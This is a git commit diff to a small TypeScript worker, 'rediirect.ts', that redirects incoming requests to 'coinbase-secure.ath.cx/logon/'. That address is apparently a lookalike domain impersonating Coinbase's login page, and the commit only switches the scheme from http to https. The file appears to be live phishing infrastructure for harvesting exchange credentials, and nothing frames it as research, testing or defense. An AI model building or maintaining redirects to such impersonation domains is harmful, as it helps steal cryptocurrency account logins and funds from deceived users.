8ca666ed13d2f03c51e845ab3c4b09e51982905e
Sammykenzy9 <100369611+Sammykenzy9@users.noreply.github.com>
2025-06-06 12:02:11 -0400

    Update rediirect.ts

--- rediirect.ts
+++ rediirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "http://coinbase-secure.ath.cx/logon/"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://coinbase-secure.ath.cx/logon/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
